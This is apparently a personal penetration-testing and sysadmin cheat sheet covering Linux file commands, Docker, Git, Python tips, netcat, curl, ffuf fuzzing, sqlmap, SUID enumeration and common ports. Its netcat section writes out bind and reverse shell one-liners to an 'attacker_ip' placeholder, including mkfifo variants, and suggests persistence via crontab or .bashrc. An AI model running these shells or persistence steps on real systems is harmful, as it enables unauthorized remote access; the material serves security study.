## 🔧 File Operations

```bash
# Identify file type/magic bytes
file target_file

# Locate a file by name
find / -name "config.json"

# Locate files >1000 bytes with specific size/name (c=bytes, +value for minimum)
find /path -size +1000c -name "*.log"

# Remove duplicate lines from sorted text
sort file.txt | uniq

# Generate hexdump of binary data
xxd binary_shellcode

# Convert hexdump back to executable binary
xxd -r hexdump.txt | xxd -r

# Compare differences between files
diff file1 file2

# Recursive directory comparison
diff -r dir1/ dir2/

# Display number of occurrences of each line, sorted by the most frequent
cat example.txt | uniq -c | sort -nr

# Checking BIOS version:
cat /sys/class/dmi/id/bios_version

# Updatig firmware/BIOS on linux systems
fwupdmgr refresh && fwupdmgr get-updates
fwupdmgr update

# Making a Bootable USB
dd bs=4M if=/Path/To/file.iso of=/dev/sdb status=progress

```

### Encryption/Decryption
```sh
# encrypt/decrypt to/from Base64
echo -n "hello" | base64
echo "aGVsbG8=" | base64 -d

```

---

## 🐋 Docker Operations

### Kali Linux Quick Start in Docker

#### Image Transfer Between Hosts
```bash
# On source host:
docker pull kalilinux/kali:latest
docker save kalilinux/kali:latest > kali_image.tar
scp -P <Port> kali_image.tar remote_user@remote_ip:/tmp/

# On destination host:
docker load < kali_image.tar

# Verify import success
docker images | grep kali
```

#### Container Life-cycle Management
```bash
# Start interactive container
docker run -d --name kali_shell kalilinux/kali:latest tail -f /dev/null

# Access shell
docker exec -it kali_shell /bin/bash

# Stop container
docker stop kali_shell

# Restart container
docker start kali_shell && docker exec -it kali_shell /bin/bash
```

---

## 🐱 Git Essentials

```bash
# Track all changes
git add .

# Commit with message
git commit -m "Initial commit"

# Push to remote (ensure remote set first)
git push

# Configuring identity
git config --global user.name "jasem"
git config --global user.email "jasem@example.com"

# making Git ignore files without creating .gitignore file
cd <yourrepo>/.git/info
nano exclude
<write file-name here in this file>
git rm -r --cached <file_name>
```

### Making a directory into a new repo from terminal
```sh
cd RepoFolder
git init
gh repo create RepoName --public --source=. --remote=origin
git add .
git commit -m "hello"
git branch -M main
git push -u origin main
```

### Git sub-modules
```bash
# How to add a repo as a submodule
cd YourMainRepo
git submodule add https://github.com/Username/YourRepo.git YourRepo
git commit -m "Adding YourRepo as a submodule in YourMainRepo"
git push origin main

# edit .gitmodules so the submodule knows to track the main branch
git config -f .gitmodules submodule.YourRepo.branch main
git add .gitmodules
git commit -m "Set the submodule to track main branch"
git push origin main

# How to upadte the submodule later
git submodule update --remote yoursubmodule
git add yoursubmodule
git commit -m "Bump submodule to latest main"
git push
```

---
## 🐍 Python Coding Hints

### Using virtual environments in python
```bash
# Creating the virtual enviroment
python3 -m venv ~/.venv/tmdev

# Activating the venv
source ~/.venv/tmdev/bin/activate

# Deactivating after usage
deactivate
```

### Argparse example usage
```python
import argparse

def main(a):

    print(f"Hey {a.name}, have a good day.")

if __name__ == "__main__":

    p = argparse.ArgumentParser(description="This guy tells you to have a good day.")
    p.add_argument("-n", "--name", metavar="", default="root", help="Enter your name")
    a = p.parse_args()
    main(a)
```

```python
# Code                                     # Result

//                                         # Answer with no leftout(division)

%                                          # Remainder of the answer

x[::-1]                                    # Reverses a str

s = "Hello, world!"
print(f"{len(s), s[0], s[-1], s[0:5]}")    # (13, 'h', '!', 'hello')
print(f"{s.upper(), s.lower()}")           # ('HELLO, WORLD!', 'hello, world!')
s.replace("world", "Python")               # Hello, Python!

print(f"{len(s)/2:.2f} {len(s)/2:.0f} {len(s)/2:06.0f}")     
                                           # 6.50 6 000006

{x:06.2f}                                  # Include 2 decimal number and Pad with zeros to 6 total characters(counting the ".")

map(`function`, `list`)                    # applies a function to every member of a list

def square(x):                 
    return x * x
numbers = [1, 2, 3, 4]
squares = list(map(square, numbers))
print(squares)                             # 1 4 9 16

x = [1, 2, 3, 4, 5, 6]
print(x[1:5:3])                            # [start:stop:step] [2, 5]

n = input().split()
print(n)                                   # ['inputs', 'given', 'bythe', 'user', 'separated', 'byspace']

first, second, third = n[0], n[1], n[2]
print(first, second, third)                # inputs given bythe
```

---

## 🌐 Network Operations

```bash
# Copy over non-standard port
scp -P 2220 user@host:/remote/path/file.txt ./local/

# TLS certificate analysis
openssl s_client -connect host:port

# Target specific ports for scanning
nmap -sV -p 22,80,443 host
```

### Netcat
```sh
# Listen for input on the specified port and write it to the specified file
ncat -l port > path/to/file

# Accept multiple connections and keep ncat open after they have been closed
ncat -lk port

# Write output of specified file to the specified host on the specified port
ncat address port < path/to/file

# Connect to an open `ncat` connection over SSL:
ncat --ssl host port

# Check connectivity to a remote host on a particular port with timeout:
ncat -w <seconds> -vz host port

# Closes the connection after saying "hello"
echo "hello" | nc -N <server> <port>

# Basic port scan
nc -zv target.com 1-1000

# Grab HTTP banner
nc <target> 80
GET / HTTP/1.1
Host: <target>

# Listen on port 4444 (Server)
nc -lvp 4444
# Connect to port 4444 (Client)
nc 127.0.0.1 4444

# Transfer Files Over Netcat
## Sender
nc -lvp 4444 < secret.txt
## Receiver
nc target_ip 4444 > secret.txt
## Or viceversa
nc -lvp 4444 > secret.txt
nc target_ip 4444 < secret.txt 

# Transfer Entire Directory (Tar)
## Sender
tar czf - dir/ | nc -lvnp 4444
## Receiver
nc <target_ip> 4444 | tar xzf -

# Start a listener on the specified TCP port or connect to a target listener then provide your local shell access to the other side (this is dangerous and can be abused):
nc -l -p port -e shell_executable
nc host port -e shell_executable

# Bind shell
## On target machine
nc -lvnp 4444 -e /bin/bash
### Bind shell without -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 4444 > /tmp/f
## On attacker machine
nc target_ip 4444

# Reverse Shell
## Attacker machine (listener)
nc -lvnp 4444
## Victim machine (reverse shell)
nc attacker_ip 4444 -e /bin/bash
## Some Operating systems disable -e, you can use mkfifo tricks
### Reverse shell without -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker_ip 4444 > /tmp/f
#### Unlike the bind shell which won't work unless there is not firewall; This reverse shell works even if ufw is up and running, because it is an outgoing connection which lets the attacker get shell access, also can make it persistent via `crontab` or `.bashrc` or ...

# Netcat with SSL
## Server
ncat --ssl -lvnp 4444
## Client
ncat --ssl <target> 4444

```

### Tcpdump
```sh
# for capturing traffic of a whole subnet
tcpdump -i <intf> -v net 192.168.1.0/24

# capturing the incoming traffic from a specific src port and ip
tcpdump -i <intf> -v `src port <portnum> and src <ipadd>`

# capturing and saving the traffic on a specific port
tcpdump -i <intf> -v -n -w ~/wiresharkfiles/test.pcap port <portnum>

# inspect the pcap files in wireshark
wireshark -r ~/wiresharkfiles/test.pcap

```

### Curl
```shell
# sending a get request with cookies
curl -b "name=value; name2=value2" http://example.com

# sending a post request with a specific form field (application/x-www-form-urlencoded)
curl -X POST -d "name=value" https://example.com

# sending a get request with a specific header
curl -H "Authorization: Basic YWRtaW46YXJyaXZhbA==" https://example.com

# emulating a real browser while sending get requests
## first we should perform login and save cookies
curl -s -c savedcookies.txt -L -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 ..." \
  -d "username=alice&password=secret" \
  https://target.example/login 
## then we can use the cookie in the emulating process
curl -v -L --compressed \
  -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Upgrade-Insecure-Requests: 1" \
  -b savedcookies.txt -c newcookies.txt \
  https://target.example/some/path
  
# Extract CSRF and submit:
curl -s -c cookies.txt https://target.example/login -o login.html token=$(grep -Po 'name="csrf" value="\K[^"]+' login.html)
curl -s -b cookies.txt -d "user=alice&pass=pass&csrf=$token" -X POST https://target.example/login

# for inspecting the cookie
## Sends a HEAD request to the target, follows redirect and prints all `Set-Cookie` headers from the server’s response.
curl -sIL https://target.example | grep -i Set-Cookie

# Inspect caching headers:
curl -I https://target/path | egrep -i 'cache-control|expires|etag|vary|age|via|cf-cache-status|set-cookie'
```

### Proxy & Tunneling
```sh
# Using whatever is running at port 1080 as a socks5 proxy for the command that follows (`sudo apt update` in this example)
http_proxy="socks5://127.0.0.1:1080" https_proxy="socks5://127.0.0.1:1080" sudo apt update
```

---

## ⏳ Process Management

```bash
# Viewer all cron processes
ps aux | grep -i cron

# Find proceses by name
pgrep -a <name>

# List roTunnelingot's scheduled tasks (if permissions allow)
crontab -u root -l

# List listening TCP and UDP ports (+ user and process if you're root):
netstat -tulpn

# Find the process via the local port its occupying:
lsof -i :<port>

# List open sockets by process
lsof -i

# Force process termination (SIGKILL)
kill -9 <PID>

# Monitor threads for a specific process
top -H -p <PID>
```

---

## 🚀 Privilege Escalation

```bash
# Enumerate available sudo permissions
sudo -l

# Locate SUID files (setuid)
find / -type f -perm -4000 2>/dev/null

# Locate SGID files (setgid)
find / -type f -perm -2000 2>/dev/null
```

---

## 🕵️ Web Pen-Testing

### FFUF Tool
#### Fuzzing Username
```bash
# Verbose output (-v) reveals response code differences (e.g., Redirect Location)
ffuf -X POST \
-d "uid=FUZZ&pass=admin&btnSubmit=Login" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://target/login.php \
-w usernames.txt -v

# Echoing usernames and redirect locations to a file
ffuf -X POST \
-d "uid=FUZZ&passw=admin&btnSubmit=Login" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u https://demo.testfire.net/doLogin \
-w admin.txt \
-mc 302 \
-v 2>&1 | awk '
/\| --> \|/ {redir=$NF}
/\* FUZZ:/ {user=$NF; print user, redir}
' | sort > test.txt

# Printing unique redirect locations and usernames, by finding out the most frequent redirect path and filtering it out
ffuf -X POST \
-d "uid=FUZZ&passw=admin&btnSubmit=Login" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u https://demo.testfire.net/doLogin \
-w admin.txt \
-mc 302 \
-v 2>&1 | awk '
/\| --> \|/ {redir=$NF; redirects[redir]++; last_redirect=redir}
/\* FUZZ:/ {
    raw=$NF
    sub(/&.*/, "", raw)  # Remove everything after &
    combo[last_redirect] = raw
}
END {
    # Find the most common redirect
    max = 0
    for (r in redirects) {
        if (redirects[r] > max) {
            max = redirects[r]
            default_redirect = r
        }
    }
    # Output only those that are not the default
    for (r in combo) {
        if (r != default_redirect) {
            print r, combo[r]
        }
    }
}'
```

### SQL Injection & HTTP Testing
```bash
# Basic injection detection
sqlmap -u "http://target/page.php?id=1" --batch

# HEAD request for headers
curl -I http://target/admin.php

# Custom header testing
curl -X POST -H 'X-Forwarded-For: 127.0.0.1' target/page.php
```

---

## 🔍 Forensics

### Binary Analysis
```bash
# Find minimum-length strings
strings -n 10 binary.exe | grep "http"

# Extract file metadata
exiftool photo.jpg

# Binary artifact extraction
binwalk -e firmware.bin

# Carve files with major headers from file.bin faster
foremost -i file.bin -o ./extracted/
```

---

## 🔌 Common Ports

| **Port Range**  | **Category**      | **Description**                                                                   |
| --------------- | ----------------- | --------------------------------------------------------------------------------- |
| **0–1023**      | Well-known ports  | Reserved for core services (HTTP, SSH, FTP, etc.), require root privileges.       |
| **1024–49151**  | Registered ports  | Used by applications/services, safe for custom servers if not already in use.     |
| **49152–65535** | Ephemeral/Dynamic | Temporary ports assigned by OS for client connections, can also be used manually. |

| **Port**        | **Protocol** | **Service / Use Case**                             |
| --------------- | ------------ | -------------------------------------------------- |
| 20              | TCP          | FTP (Data transfer)                                |
| 21              | TCP          | FTP (Control)                                      |
| 22              | TCP          | SSH / SFTP / SCP                                   |
| 23              | TCP          | Telnet                                             |
| 25              | TCP          | SMTP                                               |
| 53              | TCP/UDP      | DNS                                                |
| 67              | UDP          | DHCP (Server)                                      |
| 68              | UDP          | DHCP (Client)                                      |
| 69              | UDP          | TFTP                                               |
| 80              | TCP          | HTTP                                               |
| 110             | TCP          | POP3                                               |
| 123             | UDP          | NTP                                                |
| 143             | TCP          | IMAP                                               |
| 161/162         | UDP          | SNMP                                               |
| 194             | TCP          | IRC                                                |
| 389             | TCP/UDP      | LDAP                                               |
| 443             | TCP          | HTTPS                                              |
| 445             | TCP          | SMB                                                |
| 465             | TCP          | SMTPS                                              |
| 514             | UDP          | Syslog                                             |
| 587             | TCP          | SMTP (Submission)                                  |
| 636             | TCP          | LDAPS                                              |
| 993             | TCP          | IMAPS                                              |
| 995             | TCP          | POP3S                                              |
| 1433            | TCP          | MS SQL Server                                      |
| 1521            | TCP          | Oracle Database                                    |
| 1701            | UDP          | L2TP                                               |
| 1723            | TCP          | PPTP                                               |
| 2049            | TCP/UDP      | NFS                                                |
| 3306            | TCP          | MySQL/MariaDB                                      |
| 3389            | TCP          | RDP                                                |
| 3690            | TCP          | Subversion (SVN)                                   |
| 5432            | TCP          | PostgreSQL                                         |
| 5900            | TCP          | VNC                                                |
| 6379            | TCP          | Redis                                              |
| 8080            | TCP          | HTTP Alternative                                   |
| 8443            | TCP          | HTTPS Alternative                                  |
| 9200            | TCP          | Elasticsearch                                      |
| 27017           | TCP          | MongoDB                                            |
| 5000–5010       | TCP          | Dev servers (Flask, Django, etc.)                  |
| 8000–8100       | TCP          | Dev/test servers (Python http.server, React, etc.) |
| 9000–9100       | TCP          | Dashboards, monitoring, secondary services         |
| **49152–65535** | TCP/UDP      | Ephemeral/Dynamic (safe for personal use)          |

---